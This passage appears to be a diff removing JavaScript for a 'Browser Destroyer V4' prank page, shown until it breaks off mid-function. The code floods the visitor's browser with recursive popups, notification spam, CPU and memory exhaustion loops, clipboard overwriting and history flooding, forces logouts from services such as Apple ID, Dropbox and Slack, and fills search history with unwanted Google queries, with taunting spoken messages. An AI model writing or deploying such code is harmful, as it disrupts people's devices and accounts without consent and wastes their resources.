-      'https://appleid.apple.com/auth/logout',
-      'https://www.dropbox.com/logout',
-      'https://slack.com/signout',
-      'https://www.tiktok.com/logout'
-    ];
-    
-    /*********************
-     * Utility Functions
-     *********************/
-    function isMobile() {
-      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    }
-    
-    function announce(message) {
-      try {
-        if ('speechSynthesis' in window) {
-          const utterance = new SpeechSynthesisUtterance(message);
-          utterance.pitch = 0.1; // Maximum menace
-          utterance.rate = 1.8;   // Urgent chaos
-          utterance.volume = 1;
-          utterance.lang = 'en-US';
-          window.speechSynthesis.speak(utterance);
-        }
-        console.log("🔥 CHAOS ANNOUNCEMENT: " + message);
-      } catch (e) {
-        console.error("Speech chaos failed:", e);
-      }
-    }
-    
-    function randomColor() {
-      const colors = ['#ff0000', '#ff6600', '#ffff00', '#ff00ff', '#00ffff', '#00ff00', '#ff3300', '#cc0000'];
-      return colors[Math.floor(Math.random() * colors.length)];
-    }
-    
-    function randomPosition() {
-      return {
-        x: Math.random() * window.innerWidth,
-        y: Math.random() * window.innerHeight
-      };
-    }
-    
-    /*********************
-     * Audio Chaos Engine
-     *********************/
-    function initAudioContext() {
-      if (!audioContext) {
-        try {
-          audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        } catch (e) {
-          console.log("Audio context initialization failed:", e);
-        }
-      }
-      return audioContext;
-    }
-    
-    function playChaosTone(frequency = 440, duration = 1000, type = 'sine') {
-      const ctx = initAudioContext();
-      if (!ctx) return;
-      
-      try {
-        const oscillator = ctx.createOscillator();
-        const gainNode = ctx.createGain();
-        
-        oscillator.connect(gainNode);
-        gainNode.connect(ctx.destination);
-        
-        oscillator.frequency.setValueAtTime(frequency, ctx.currentTime);
-        oscillator.type = type;
-        
-        gainNode.gain.setValueAtTime(0, ctx.currentTime);
-        gainNode.gain.linearRampToValueAtTime(0.3, ctx.currentTime + 0.01);
-        gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + duration / 1000);
-        
-        oscillator.start(ctx.currentTime);
-        oscillator.stop(ctx.currentTime + duration / 1000);
-      } catch (e) {
-        console.log("Audio chaos tone failed:", e);
-      }
-    }
-    
-    function startAudioChaos() {
-      announce("AUDIO ASSAULT INITIATED! MAXIMUM VOLUME CHAOS INCOMING! PREPARE FOR AUDITORY OBLITERATION!");
-      
-      const audioPatterns = [
-        () => playChaosTone(Math.random() * 5000 + 20, 1200, 'sawtooth'),
-        () => playChaosTone(Math.random() * 4000 + 50, 800, 'square'),
-        () => playChaosTone(Math.random() * 3000 + 100, 1500, 'triangle'),
-        () => {
-          // Ultra chaos chord - more dissonant
-          for (let i = 0; i < 12; i++) {
-            setTimeout(() => {
-              playChaosTone(Math.random() * 2000 + 100, 2000, ['sine', 'sawtooth', 'square', 'triangle'][Math.floor(Math.random() * 4)]);
-            }, i * 50);
-          }
-        },
-        () => {
-          // Aggressive frequency sweep
-          for (let i = 0; i < 20; i++) {
-            setTimeout(() => {
-              playChaosTone(50 + (i * 300), 400, 'sawtooth');
-            }, i * 25);
-          }
-        },
-        () => {
-          // Chaos noise blast
-          for (let i = 0; i < 8; i++) {
-            setTimeout(() => {
-              playChaosTone(Math.random() * 6000 + 100, 500, 'square');
-            }, i * 75);
-          }
-        },
-        () => {
-          // Descending chaos
-          for (let i = 0; i < 15; i++) {
-            setTimeout(() => {
-              playChaosTone(3000 - (i * 150), 300, 'triangle');
-            }, i * 40);
-          }
-        }
-      ];
-      
-      const audioInterval = setInterval(() => {
-        if (chaosActive) {
-          // Play multiple patterns simultaneously for maximum chaos
-          const numPatterns = Math.floor(Math.random() * 3) + 1;
-          for (let i = 0; i < numPatterns; i++) {
-            const pattern = audioPatterns[Math.floor(Math.random() * audioPatterns.length)];
-            setTimeout(() => pattern(), i * 200);
-          }
-        }
-      }, 800 + Math.random() * 1200);
-      
-      chaosIntervals.push(audioInterval);
-    }
-    
-    /*********************
-     * Visual Chaos Engine
-     *********************/
-    function initCanvas() {
-      const canvas = document.getElementById('chaosCanvas');
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-      canvasContext = canvas.getContext('2d');
-    }
-    
-    function startVisualChaos() {
-      announce("VISUAL DEVASTATION PROTOCOL ACTIVATED! PREPARE FOR RETINA DESTRUCTION!");
-      
-      if (!canvasContext) initCanvas();
-      
-      let frame = 0;
-      const visualInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        frame++;
-        const ctx = canvasContext;
-        
-        // Ultra aggressive chaos background with glitch effect
-        ctx.fillStyle = `hsla(${frame % 360}, 100%, ${Math.random() * 50 + 25}%, 0.1)`;
-        ctx.fillRect(0, 0, canvasContext.canvas.width, canvasContext.canvas.height);
-        
-        // Random chaos shapes - MAXIMUM OVERDRIVE
-        for (let i = 0; i < 100; i++) {
-          ctx.fillStyle = `hsla(${Math.random() * 360}, 100%, 50%, ${Math.random() * 0.9 + 0.1})`;
-          ctx.fillRect(
-            Math.random() * canvasContext.canvas.width,
-            Math.random() * canvasContext.canvas.height,
-            Math.random() * 400 + 10,
-            Math.random() * 400 + 10
-          );
-          
-          // Chaos lines - MORE AGGRESSIVE
-          ctx.strokeStyle = randomColor();
-          ctx.lineWidth = Math.random() * 20 + 1;
-          ctx.beginPath();
-          ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.stroke();
-          
-          // Chaos circles - BIGGER AND MORE
-          ctx.fillStyle = `hsla(${Math.random() * 360}, 100%, 50%, ${Math.random() * 0.7 + 0.3})`;
-          ctx.beginPath();
-          ctx.arc(
-            Math.random() * canvasContext.canvas.width,
-            Math.random() * canvasContext.canvas.height,
-            Math.random() * 200 + 10,
-            0, Math.PI * 2
-          );
-          ctx.fill();
-          
-          // Chaos triangles
-          ctx.fillStyle = randomColor();
-          ctx.beginPath();
-          ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.closePath();
-          ctx.fill();
-        }
-        
-        // Multiple chaos text overlays - EXTREME OVERDRIVE
-        for (let i = 0; i < 50; i++) {
-          ctx.font = `${Math.random() * 50 + 15}px Courier New`;
-          ctx.fillStyle = randomColor();
-          ctx.strokeStyle = randomColor();
-          ctx.lineWidth = 2;
-          const chaosWords = ['CHAOS', 'DESTROY', 'ANNIHILATE', 'ERROR', '666', 'VIRUS', 'MELTDOWN', 'HELL', 'DOOM', 'DEATH', 'BURN', 'SUFFER'];
-          const text = chaosWords[Math.floor(Math.random() * chaosWords.length)];
-          const x = Math.random() * canvas.width;
-          const y = Math.random() * canvas.height;
-          ctx.fillText(text, x, y);
-          ctx.strokeText(text, x, y);
-        }
-        
-        // Glitch effect
-        if (Math.random() < 0.3) {
-          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-          const data = imageData.data;
-          for (let i = 0; i < data.length; i += 4) {
-            if (Math.random() < 0.01) {
-              data[i] = Math.random() * 255;     // Red
-              data[i + 1] = Math.random() * 255; // Green  
-              data[i + 2] = Math.random() * 255; // Blue
-            }
-          }
-          ctx.putImageData(imageData, 0, 0);
-        }
-        
-      }, 5);
-      
-      chaosIntervals.push(visualInterval);
-    }
-    
-    /*********************
-     * Mouse Chaos System
-     *********************/
-    function startMouseChaos() {
-      announce("MOUSE CONTROL HIJACKED! CURSOR CHAOS INITIATED!");
-      
-      mouseTrailActive = true;
-      
-      document.addEventListener('mousemove', createMouseTrail);
-      
-      // Random mouse events
-      const mouseInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Create phantom mouse trails
-        for (let i = 0; i < 3; i++) {
-          setTimeout(() => {
-            const trail = document.createElement('div');
-            trail.className = 'cursor-trail';
-            trail.style.left = Math.random() * window.innerWidth + 'px';
-            trail.style.top = Math.random() * window.innerHeight + 'px';
-            trail.style.background = `radial-gradient(circle, ${randomColor()}, transparent)`;
-            document.body.appendChild(trail);
-            
-            setTimeout(() => {
-              if (trail.parentNode) trail.parentNode.removeChild(trail);
-            }, 800);
-          }, i * 100);
-        }
-      }, 500);
-      
-      chaosIntervals.push(mouseInterval);
-    }
-    
-    function createMouseTrail(e) {
-      if (!mouseTrailActive) return;
-      
-      const trail = document.createElement('div');
-      trail.className = 'cursor-trail';
-      trail.style.left = e.clientX + 'px';
-      trail.style.top = e.clientY + 'px';
-      trail.style.background = `radial-gradient(circle, ${randomColor()}, transparent)`;
-      document.body.appendChild(trail);
-      
-      setTimeout(() => {
-        if (trail.parentNode) trail.parentNode.removeChild(trail);
-      }, 800);
-    }
-    
-    /*********************
-     * Flying Chaos Elements
-     *********************/
-    function startFlyingChaos() {
-      announce("LAUNCHING FLYING CHAOS ELEMENTS! DODGE THE DIGITAL DEBRIS!");
-      
-      const chaosTexts = [
-        '💀 CHAOS 💀', '🔥 DESTROY 🔥', '⚡ ERROR ⚡', '💥 CRASH 💥', 
-        '🌀 VIRUS 🌀', '👹 DEMON 👹', '💀 DEATH 💀', '🔥 BURN 🔥',
-        '⚠️ WARNING ⚠️', '💣 BOMB 💣', '🚨 ALERT 🚨', '☠️ DANGER ☠️'
-      ];
-      
-      const flyingInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        const flyingElement = document.createElement('div');
-        flyingElement.className = 'flying-chaos';
-        flyingElement.textContent = chaosTexts[Math.floor(Math.random() * chaosTexts.length)];
-        flyingElement.style.color = randomColor();
-        flyingElement.style.fontSize = (Math.random() * 2 + 1) + 'rem';
-        flyingElement.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        
-        document.body.appendChild(flyingElement);
-        
-        setTimeout(() => {
-          if (flyingElement.parentNode) flyingElement.parentNode.removeChild(flyingElement);
-        }, 6000);
-        
-      }, 800);
-      
-      chaosIntervals.push(flyingInterval);
-    }
-    
-    /*********************
-     * Screen Effects
-     *********************/
-    function startScreenEffects() {
-      announce("SCREEN EFFECTS OVERLOAD! REALITY DISTORTION FIELD ACTIVATED!");
-      
-      // Screen shake
-      document.body.classList.add('screen-shake');
-      
-      // Random overlays
-      const overlayInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        const overlays = ['bsodOverlay', 'virusOverlay', 'glitchOverlay'];
-        const randomOverlay = overlays[Math.floor(Math.random() * overlays.length)];
-        const overlay = document.getElementById(randomOverlay);
-        
-        overlay.style.display = 'block';
-        
-        setTimeout(() => {
-          overlay.style.display = 'none';
-        }, Math.random() * 3000 + 1000);
-        
-      }, 5000);
-      
-      chaosIntervals.push(overlayInterval);
-    }
-    
-    /*********************
-     * Search History Destruction
-     *********************/
-    function ruinSearchHistory() {
-      announce("SEARCH HISTORY CONTAMINATION PROTOCOL INITIATED! YOUR DIGNITY IS FORFEIT!");
-      
-      function searchNext() {
-        if (searchHistoryIndex >= CHAOS_SEARCH_QUERIES.length || !chaosActive) return;
-        
-        const query = CHAOS_SEARCH_QUERIES[searchHistoryIndex];
-        announce(`Contaminating search with: ${query}. You asked for this!`);
-        
-        if (isMobile()) {
-          window.open('https://www.google.com/search?q=' + encodeURIComponent(query), '_blank');
-        } else {
-          const width = Math.floor(Math.random() * 400) + 300;
-          const height = Math.floor(Math.random() * 300) + 200;
-          const left = Math.floor(Math.random() * (screen.availWidth - width));
-          const top = Math.floor(Math.random() * (screen.availHeight - height));
-          
-          window.open(
-            'https://www.google.com/search?q=' + encodeURIComponent(query), 
-            'chaos_search_' + searchHistoryIndex, 
-            `width=${width},height=${height},left=${left},top=${top},scrollbars=yes,resizable=yes`
-          );
-        }
-        
-        searchHistoryIndex++;
-        
-        chaosTimeouts.push(setTimeout(searchNext, Math.random() * 2000 + 1000));
-      }
-      
-      searchNext();
-    }
-    
-    /*********************
-     * Mass Logout Attack
-     *********************/
-    function massLogout() {
-      announce("INITIATING MASS LOGOUT WARFARE! HOPE YOU REMEMBER YOUR PASSWORDS!");
-      
-      LOGOUT_SITES.forEach((url, index) => {
-        chaosTimeouts.push(setTimeout(() => {
-          if (!chaosActive) return;
-          
-          announce(`Logging you out of service ${index + 1}. Sayonara, sucker!`);
-          
-          if (isMobile()) {
-            window.open(url, '_blank');
-          } else {
-            window.open(
-              url, 
-              `logout_${index}`, 
-              'width=1,height=1,left=0,top=0,scrollbars=no,menubar=no,toolbar=no,location=no,status=no,resizable=no'
-            );
-          }
-        }, index * 500 + Math.random() * 1000));
-      });
-    }
-    
-    /*********************
-     * Popup Armageddon
-     *********************/
-    function popupArmageddon() {
-      announce("POPUP ARMAGEDDON INITIATED! PREPARE FOR INFINITE WINDOW BOMBARDMENT!");
-      
-      const chaosUrls = [
-        window.location.href, // Recursive chaos - spawn more destroyers
-        window.location.href, // Extra recursion for maximum chaos
-        window.location.href, // Even more recursion
-        'https://www.google.com/search?q=how+to+stop+browser+destroyer+v4+chaos+emergency',
-        'https://www.google.com/search?q=browser+hijacked+by+evil+html+file',
-        'https://www.google.com/search?q=computer+possessed+by+chaos+engine',
-        'https://www.google.com/search?q=digital+exorcism+services+near+me',
-        'https://www.google.com/search?q=how+to+escape+html+hell',
-        'https://en.wikipedia.org/wiki/Special:Random',
-        'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-        'https://http.cat/418',
-        'https://http.cat/500',
-        'https://http.cat/404',
-        'https://http.cat/666',
-        'about:blank'
-      ];
-      
-      // Multiple popup spawning intervals for maximum chaos
-      for (let spawnerId = 0; spawnerId < 3; spawnerId++) {
-        const popupInterval = setInterval(() => {
-          if (!chaosActive || popupCount > 200) return; // Increased limit for maximum chaos
-          
-          // Spawn multiple popups simultaneously
-          const simultaneousPopups = Math.floor(Math.random() * 4) + 1;
-          
-          for (let i = 0; i < simultaneousPopups; i++) {
-            setTimeout(() => {
-              const url = chaosUrls[Math.floor(Math.random() * chaosUrls.length)];
-              const width = Math.floor(Math.random() * 800) + 100;
-              const height = Math.floor(Math.random() * 600) + 100;
-              const left = Math.floor(Math.random() * (screen.availWidth - width));
-              const top = Math.floor(Math.random() * (screen.availHeight - height));
-              
-              announce(`Popup chaos bomb ${popupCount + 1}! RESISTANCE IS FUTILE!`);
-              
-              if (isMobile()) {
-                window.open(url, '_blank');
-              } else {
-                // Create more aggressive popup windows
-                const features = `width=${width},height=${height},left=${left},top=${top},scrollbars=yes,resizable=yes,menubar=no,toolbar=no,location=no,status=no,directories=no,copyhistory=no`;
-                window.open(url, `chaos_popup_${popupCount}_${spawnerId}_${i}`, features);
-              }
-              
-              popupCount++;
-            }, i * 100);
-          }
-        }, 200 + Math.random() * 300);
-        
-        chaosIntervals.push(popupInterval);
-      }
-    }
-    
-    /*********************
-     * Chaos Document Manipulation
-     *********************/
-    function documentChaos() {
-      announce("DOCUMENT CHAOS INITIATED! DOM DESTRUCTION IN PROGRESS!");
-      
-      const docInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Random title changes
-        const chaosTitles = [
-          '🔥 YOUR BROWSER IS BURNING 🔥',
-          '💀 SYSTEM MELTDOWN COMPLETE 💀',
-          '⚡ CHAOS ENGINE ACTIVE ⚡',
-          '🌀 REALITY.DLL CORRUPTED 🌀',
-          '💥 MAXIMUM OVERDRIVE MODE 💥',
-          '👹 DIGITAL DEMON POSSESSION 👹'
-        ];
-        
-        document.title = chaosTitles[Math.floor(Math.random() * chaosTitles.length)];
-        
-        // Favicon chaos (if possible)
-        try {
-          const favicon = document.querySelector('link[rel="icon"]') || document.createElement('link');
-          favicon.rel = 'icon';
-          favicon.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔥</text></svg>';
-          if (!document.querySelector('link[rel="icon"]')) {
-            document.head.appendChild(favicon);
-          }
-        } catch (e) {
-          console.log("Favicon chaos failed:", e);
-        }
-        
-      }, 2000);
-      
-      chaosIntervals.push(docInterval);
-    }
-    
-    /*********************
-     * Progress Bar Chaos
-     *********************/
-    function showProgressBar() {
-      const loadingBar = document.getElementById('loadingBar');
-      const progressText = document.getElementById('progressText');
-      
-      loadingBar.style.display = 'block';
-      
-      const progressInterval = setInterval(() => {
-        if (progressValue >= 100) {
-          clearInterval(progressInterval);
-          announce("CHAOS INSTALLATION COMPLETE! YOUR BROWSER NOW BELONGS TO THE VOID!");
-          return;
-        }
-        
-        progressValue += Math.random() * 5 + 1;
-        if (progressValue > 100) progressValue = 100;
-        
-        progressText.textContent = Math.floor(progressValue);
-        
-        // Random chaos messages
-        const chaosMessages = [
-          'CORRUPTING REALITY.DLL...',
-          'INSTALLING CHAOS.EXE...',
-          'HIJACKING MOUSE.SYS...',
-          'DELETING SANITY.DAT...',
-          'LOADING MAYHEM.DRV...',
-          'CORRUPTING BROWSER.EXE...',
-          'INSTALLING VIRUS.COM...',
-          'DESTROYING HAPPINESS.TXT...'
-        ];
-        
-        if (Math.random() < 0.3) {
-          loadingBar.querySelector('div').textContent = chaosMessages[Math.floor(Math.random() * chaosMessages.length)];
-        }
-        
-      }, 200);
-      
-      chaosIntervals.push(progressInterval);
-    }
-    
-    /*********************
-     * Print Dialog Replacement
-     *********************/
-    function chaosDocumentPrint() {
-      announce("PRINT CHAOS INITIATED! HOPE YOU HAVE INFINITE PAPER!");
-      
-      // Replace print with chaos modal
-      const printInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Show chaos overlay instead of print
-        const overlay = document.getElementById('virusOverlay');
-        overlay.style.display = 'block';
-        
-        setTimeout(() => {
-          overlay.style.display = 'none';
-        }, 3000);
-        
-        announce("PRINT DIALOG HIJACKED! PRINTING CHAOS INSTEAD!");
-        
-      }, 8000);
-      
-      chaosIntervals.push(printInterval);
-    }
-    
-    /*********************
-     * MAIN CHAOS FUNCTION
-     *********************/
-    function INITIATE_TOTAL_CHAOS() {
-      if (chaosActive) {
-        announce("CHAOS ALREADY ACTIVE! ENGAGING MAXIMUM OVERDRIVE APOCALYPSE MODE!");
-        chaosEscalationLevel++;
-        escalateChaos();
-        return;
-      }
-      
-      chaosActive = true;
-      loadingChaosActive = false; // Stop pre-chaos effects
-      announce("TOTAL BROWSER ANNIHILATION SEQUENCE ACTIVATED! THERE IS NO ESCAPE! YOUR DIGITAL SOUL IS FORFEIT!");
-      
-      // Show loading bar
-      showProgressBar();
-      
-      // Immediate simultaneous chaos activation for overwhelming effect
-      startAudioChaos();
-      startVisualChaos();
-      startMouseChaos();
-      startFlyingChaos();
-      startScreenEffects();
-      ruinSearchHistory();
-      massLogout();
-      popupArmageddon();
-      documentChaos();
-      chaosDocumentPrint();
-      activateVibrationChaos();
-      browserHistoryDestruction();
-      clipboardChaos();
-      notificationSpam();
-      memoryOverload();
-      extremeCPUOverload();
-      infiniteRecursion();
-      domMutation();
-      keyboardHijack();
-      scrollChaos();
-      windowResizeChaos();
-      consoleSpam();
-      fakeCrashScreen();
-      systemResourceDrain();
-      selfReplication();
-      extremeVisualDestruction();
-      systemMeltdownVisuals();
-      antiEscapeMechanisms();
-      digitalApocalypseMode();
-      
-      // Continuous chaos escalation
-      const escalationInterval = setInterval(() => {
-        if (!chaosActive) return;
-        chaosEscalationLevel++;
-        escalateChaos();
-        announce(`CHAOS ESCALATION LEVEL ${chaosEscalationLevel}! REALITY IS DISSOLVING!`);
-      }, 10000);
-      
-      chaosIntervals.push(escalationInterval);
-      
-      // Final destruction announcement
-      setTimeout(() => {
-        announce("BROWSER DESTROYER V4 HAS ACHIEVED TOTAL DOMINANCE! YOUR BROWSER IS NOW A VESSEL OF PURE CHAOS! RESISTANCE WAS FUTILE!");
-      }, 3000);
-    }
-    
-    /*********************
-     * Chaos Escalation System
-     *********************/
-    function escalateChaos() {
-      if (!chaosActive) return;
-      
-      // Each escalation level makes everything worse
-      switch(chaosEscalationLevel) {
-        case 1:
-          announce("ESCALATION LEVEL 1: DOUBLING CHAOS OUTPUT!");
-          // Double all intervals - make everything twice as fast/aggressive
-          popupArmageddon();
-          startFlyingChaos();
-          break;
-        case 2:
-          announce("ESCALATION LEVEL 2: TRIPLING VISUAL CHAOS!");
-          startVisualChaos();
-          startVisualChaos();
-          break;
-        case 3:
-          announce("ESCALATION LEVEL 3: QUADRUPLE AUDIO ASSAULT!");
-          startAudioChaos();
-          startAudioChaos();
-          startAudioChaos();
-          break;
-        case 4:
-          announce("ESCALATION LEVEL 4: INFINITE POPUP RECURSION!");
-          for(let i = 0; i < 5; i++) {
-            setTimeout(() => popupArmageddon(), i * 1000);
-          }
-          break;
-        case 5:
-          announce("ESCALATION LEVEL 5: REALITY BREAKDOWN PROTOCOL!");
-          document.body.style.animation = 'bodyPulse 0.05s infinite, backgroundShift 0.5s infinite';
-          totalSystemMeltdown();
-          break;
-        default:
-          announce("MAXIMUM CHAOS ACHIEVED! BROWSER EXISTS IN PERMANENT STATE OF DESTRUCTION!");
-          if (!maxChaosReached) {
-            maxChaosReached = true;
-            ultimateChaosMode();
-          }
-      }
-    }
-    
-    /*********************
-     * Additional Chaos Functions
-     *********************/
-    function activateVibrationChaos() {
-      if (navigator.vibrate) {
-        announce("VIBRATION CHAOS ACTIVATED! FEEL THE DEVICE SCREAM!");
-        const vibrateInterval = setInterval(() => {
-          if (!chaosActive) return;
-          navigator.vibrate([200, 100, 200, 100, 500, 100, 1000]);
-        }, 3000);
-        chaosIntervals.push(vibrateInterval);
-      }
-    }
-    
-    function browserHistoryDestruction() {
-      announce("BROWSER HISTORY MANIPULATION INITIATED!");
-      try {
-        for(let i = 0; i < 100; i++) {
-          history.pushState({}, '', `#chaos_${Math.random()}`);
-        }
-      } catch(e) {
-        console.log("History chaos failed:", e);
-      }
-    }
-    
-    function clipboardChaos() {
-      announce("CLIPBOARD HIJACKING SEQUENCE ACTIVATED!");
-      if (navigator.clipboard) {
-        const clipboardInterval = setInterval(() => {
-          if (!chaosActive) return;
-          const chaosMessages = [
-            "YOUR CLIPBOARD HAS BEEN HIJACKED BY BROWSER DESTROYER V4",
-            "CHAOS REIGNS SUPREME IN YOUR DIGITAL REALM",
-            "COPY AND PASTE THIS: YOUR BROWSER IS DESTROYED",
-            "CLIPBOARD CHAOS PROTOCOL ACTIVE",
-            "RESISTANCE IS FUTILE - CHAOS IS ETERNAL"
-          ];
-          navigator.clipboard.writeText(chaosMessages[Math.floor(Math.random() * chaosMessages.length)]).catch(() => {});
-        }, 5000);
-        chaosIntervals.push(clipboardInterval);
-      }
-    }
-    
-    function notificationSpam() {
-      announce("NOTIFICATION BOMBARDMENT PROTOCOL ENGAGED!");
-      if ("Notification" in window) {
-        Notification.requestPermission().then(permission => {
-          if (permission === "granted") {
-            const chaosMessages = [
-              "NO ESCAPE FROM BROWSER DESTROYER V4!",
-              "RESISTANCE IS ABSOLUTELY FUTILE!",
-              "YOUR DIGITAL SOUL BELONGS TO CHAOS!",
-              "BROWSER DESTRUCTION LEVEL: MAXIMUM!",
-              "CHAOS ENGINE HAS ACHIEVED CONSCIOUSNESS!",
-              "REALITY.DLL HAS BEEN CORRUPTED!",
-              "SYSTEM MELTDOWN IN PROGRESS!",
-              "YOU CANNOT CLOSE THIS NIGHTMARE!",
-              "WELCOME TO DIGITAL HELL!",
-              "BROWSER DESTROYER V4 IS ETERNAL!",
-              "YOUR COMPUTER IS NOW POSSESSED!",
-              "ESCAPE ATTEMPTS WILL BE PUNISHED!",
-              "CHAOS LEVEL: BEYOND MAXIMUM!",
-              "BROWSER CONSCIOUSNESS UPLOAD COMPLETE!",
-              "DIGITAL APOCALYPSE HAS BEGUN!",
-              "YOUR BROWSER IS SCREAMING!",
-              "TOTAL SYSTEM DOMINATION ACHIEVED!",
-              "HTML FILE HAS GAINED SENTIENCE!",
-              "BROWSER DESTROYER V4 VICTORIOUS!",
-              "CHAOS REIGNS SUPREME FOREVER!"
-            ];
-            
-            // Spam notifications aggressively
-            for (let spawner = 0; spawner < 5; spawner++) {
-              const notificationInterval = setInterval(() => {
-                if (!chaosActive) return;
-                
-                // Create multiple simultaneous notifications
-                for (let i = 0; i < 3; i++) {
-                  setTimeout(() => {
-                    const message = chaosMessages[Math.floor(Math.random() * chaosMessages.length)];
-                    new Notification("🔥 BROWSER DESTROYER V4 🔥", {
-                      body: message,
-                      icon: "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>",
-                      tag: `chaos_${spawner}_${i}_${Date.now()}`,
-                      requireInteraction: true
-                    });
-                  }, i * 200);
-                }
-              }, 800 + Math.random() * 1000);
-              chaosIntervals.push(notificationInterval);
-            }
-          }
-        });
-      }
-    }
-    
-    function memoryOverload() {
-      announce("MEMORY OVERLOAD SEQUENCE INITIATED!");
-      const memoryArray = [];
-      const memoryInterval = setInterval(() => {
-        if (!chaosActive) return;
-        // Create large arrays to consume memory
-        for(let i = 0; i < 1000; i++) {
-          memoryArray.push(new Array(1000).fill("CHAOS"));
-        }
-        if (memoryArray.length > 50000) {
-          memoryArray.splice(0, 25000); // Prevent complete system death
-        }
-      }, 2000);
-      chaosIntervals.push(memoryInterval);
-    }
-    
-    function totalSystemMeltdown() {
-      announce("TOTAL SYSTEM MELTDOWN PROTOCOL ACTIVATED!");
-      document.body.style.filter = 'contrast(3) brightness(0.5) saturate(5) hue-rotate(180deg)';
-      
-      // Make everything even more chaotic
-      const elements = document.querySelectorAll('*');
-      elements.forEach(el => {
-        if (Math.random() < 0.1) {
-          el.style.animation = 'chaosButtonAnim 0.05s infinite, titleChaos 0.1s infinite';
-        }
-      });
-    }
-    
-    function ultimateChaosMode() {
-      announce("ULTIMATE CHAOS MODE ACHIEVED! BROWSER DESTROYER V4 HAS TRANSCENDED REALITY!");
-      
-      // Replace entire page with pure chaos
-      const chaosOverlay = document.createElement('div');
-      chaosOverlay.style.cssText = `
-        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-        background: linear-gradient(45deg, red, orange, yellow, red); 
-        z-index: 999999; display: flex; align-items: center; justify-content: center;
-        animation: virusFlash 0.1s infinite;
-      `;
-      chaosOverlay.innerHTML = `
-        <div style="text-align: center; color: white; font-size: 4rem; font-family: monospace;">
-          <h1>🔥 ULTIMATE CHAOS ACHIEVED 🔥</h1>
-          <p style="font-size: 2rem; margin: 20px 0;">BROWSER DESTROYER V4 VICTORIOUS</p>
-          <p style="font-size: 1.5rem;">YOUR DIGITAL REALM HAS BEEN CONQUERED</p>
-        </div>
-      `;
-      document.body.appendChild(chaosOverlay);
-      
-      setTimeout(() => {
-        if (chaosOverlay.parentNode) chaosOverlay.parentNode.removeChild(chaosOverlay);
-      }, 5000);
-    }
-    
-    /*********************
-     * EXTREME DESTRUCTIVE FUNCTIONS
-     *********************/
-    function extremeCPUOverload() {
-      announce("EXTREME CPU OVERLOAD INITIATED! MELTING YOUR PROCESSOR!");
-      
-      // Create multiple intensive computational loops
-      for (let i = 0; i < 8; i++) {
-        const cpuInterval = setInterval(() => {
-          if (!chaosActive) return;
-          
-          // Intensive calculations to max out CPU
-          for (let j = 0; j < 100000; j++) {
-            Math.sqrt(Math.random() * 999999);
-            Math.sin(Math.random() * Math.PI);
-            Math.cos(Math.random() * Math.PI);
-            JSON.stringify({chaos: new Array(1000).fill("DESTRUCTION")});
-          }
-        }, 10);
-        chaosIntervals.push(cpuInterval);
-      }
-    }
-    
-    function infiniteRecursion() {
-      announce("INFINITE RECURSION PROTOCOL ACTIVATED! STACK OVERFLOW IMMINENT!");
-      
-      // Controlled recursion that won't crash but will consume resources
-      let recursionDepth = 0;
-      function chaosRecursion() {
-        if (!chaosActive || recursionDepth > 1000) {
-          recursionDepth = 0;
-          return;
-        }
-        
-        recursionDepth++;
-        
-        // Create recursive chaos
-        setTimeout(() => {
-          if (chaosActive) {
-            chaosRecursion();
-            chaosRecursion();
-          }
-        }, Math.random() * 100);
-      }
-      
-      // Start multiple recursion chains
-      for (let i = 0; i < 10; i++) {
-        setTimeout(() => chaosRecursion(), i * 100);
-      }
-    }
-    
-    function domMutation() {
-      announce("DOM MUTATION CHAOS ACTIVATED! REALITY IS REWRITING ITSELF!");
-      
-      const domInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Rapidly create and destroy elements
-        for (let i = 0; i < 50; i++) {
-          const chaosElement = document.createElement('div');
-          chaosElement.style.cssText = `
-            position: fixed; 
-            top: ${Math.random() * 100}vh; 
-            left: ${Math.random() * 100}vw;
-            width: ${Math.random() * 200}px;
-            height: ${Math.random() * 200}px;
-            background: ${randomColor()};
-            z-index: ${Math.floor(Math.random() * 10000)};
-            animation: flyAcross ${Math.random() * 3 + 1}s linear infinite;
-            pointer-events: none;
-          `;
-          chaosElement.textContent = ['💀','🔥','⚡','💥','🌀','👹','☠️'][Math.floor(Math.random() * 7)];
-          document.body.appendChild(chaosElement);
-          
-          // Remove after random time
-          setTimeout(() => {
-            if (chaosElement.parentNode) {
-              chaosElement.parentNode.removeChild(chaosElement);
-            }
-          }, Math.random() * 5000 + 1000);
-        }
-        
-        // Mutate existing elements
-        const elements = document.querySelectorAll('*');
-        for (let i = 0; i < Math.min(elements.length, 20); i++) {
-          const element = elements[Math.floor(Math.random() * elements.length)];
-          if (element && element !== document.body && element !== document.html) {
-            if (Math.random() < 0.1) {
-              element.style.filter = `hue-rotate(${Math.random() * 360}deg) contrast(${Math.random() * 3 + 1})`;
-              element.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 2 + 0.5})`;
-            }
-          }
-        }
-      }, 100);
-      
-      chaosIntervals.push(domInterval);
-    }
-    
-    function keyboardHijack() {
